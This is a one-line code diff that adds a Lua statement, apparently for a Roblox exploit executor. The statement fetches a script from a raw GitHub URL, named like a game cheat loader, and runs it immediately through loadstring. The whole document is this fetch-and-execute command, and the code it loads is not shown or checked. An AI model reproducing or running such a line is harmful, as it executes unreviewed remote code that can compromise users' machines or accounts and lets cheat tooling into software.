@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/duels-rally-panic-spam7-kuy43wgeo8t43c.lua"))()
